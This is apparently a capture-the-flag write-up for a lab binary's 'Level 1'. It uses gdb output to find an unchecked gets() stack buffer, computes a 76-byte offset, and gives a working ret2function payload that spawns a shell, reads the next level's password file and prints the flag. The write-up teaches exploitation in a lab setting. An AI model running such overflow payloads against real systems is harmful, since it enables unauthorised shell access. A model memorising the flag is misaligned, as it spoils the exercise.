# Level 1

## Analysis

```
(gdb) disas main
   0x08048486 <+6>:     sub    $0x50,%esp        ; reserve 80 bytes
   0x08048489 <+9>:     lea    0x10(%esp),%eax   ; buffer at esp+0x10
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
```

`main` only calls `gets()` into a stack buffer, then returns. `gets()` has no bounds check, so we can [overflow the buffer](../knowledge_base/buffer_overflow_101.md) and overwrite the saved return address (the address `main` jumps back to at `ret`).

Looking for something to jump to:

```
(gdb) info functions
0x08048444  run
```

`run` is never called by `main`. Disassembling it shows `system("/bin/sh")`:

```
(gdb) disas run
call   <fwrite@plt>
call   <system@plt>    ; arg "/bin/sh"
```

> **[ret2function](../knowledge_base/ret2libc.md#ret2libc-vs-ret2function):** instead of injecting shellcode, we point the overwritten return address at code that already exists in the binary. `run()` is dead code that spawns a shell, exactly what we need. Works even with NX on (we execute `.text`, not the stack) and ASLR off (the address is fixed).

## Exploit

### Find the offset

We need the distance from the start of the buffer to the return address. The buffer is 64 bytes (`0x50 - 0x10`), then there are a few more bytes (saved EBP plus stack-alignment padding) before the return address:

```
bytes  0..63   buffer (64 bytes)
bytes 64..75   saved EBP + alignment padding (12 bytes)
bytes 76..79   saved return address   <- our target
```

That gives offset **76**. Confirm it: send 76 filler bytes, then 4 marker bytes `BBBB`, and check where [EIP](../knowledge_base/gdb_guide.md#reading-x86-assembly-32-bit) ends up (EIP = the register holding the next instruction to run; control it and you control where the program jumps):

```
(gdb) run < <(python -c "print('A' * 76 + 'BBBB')")
Program received signal SIGSEGV
0x42424242 in ?? ()
```

EIP = `0x42424242` (`"BBBB"`), so the 4 bytes at offset 76 landed exactly on the return address.

> **Why exactly 76?** Too few (say 70) and `BBBB` stops short of the return address, so it stays intact and `main` returns normally, no control. Too many (say 80) and the return address fills with `A`s while `BBBB` overshoots past it, so EIP becomes `0x41414141`. Our 4 target bytes must sit exactly at offset 76.

### Target address

```
(gdb) p run
$1 = 0x8048444 <run>
```

Little-endian: `\x44\x84\x04\x08`.

### Payload

```bash
$ (python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

`; cat` keeps stdin open so the spawned shell receives input.

Flag: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
